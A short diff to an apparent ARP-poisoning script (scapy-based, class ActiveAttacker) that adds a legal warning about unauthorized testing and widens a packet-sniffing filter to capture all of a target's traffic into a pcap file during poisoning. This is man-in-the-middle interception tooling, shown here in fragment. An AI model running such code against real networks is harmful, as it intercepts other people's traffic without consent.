@@ -1,4 +1,13 @@
 #!/home/kali/cyber-attack-test/env/bin/python
+'''
+WARNING: 
+Unauthorized network interference violates:
+- 18 U.S. Code § 1030 (CFAA)
+- Computer Misuse Act 1990 (UK)
+- 刑法第285条 (中国大陆)
+
+仅限授权测试使用！攻击他人网络将面临刑事指控。
+'''
 from multiprocessing import Process, Event
 from ipaddress import ip_address
 from scapy.all import ARP, Ether, conf, sendp, sniff, srp, wrpcap # type: ignore
@@ -122,7 +131,7 @@ class ActiveAttacker:
 
     def sniff_and_store(self, arper: Arper):
         print(f'Sniffing {arper.count} packets')
-        bpf_filter = f'host {arper.target} and host {arper.gateway} and not arp'
+        bpf_filter = f'host {arper.target} and not arp'
         packets = sniff(count=arper.count, filter=bpf_filter, iface=arper.interface)
         arper.poison_event.set()
         wrpcap(f"arper_{arper.target}_{datetime.now().strftime('%Y%m%d-%H%M%S')}.pcap", packets)
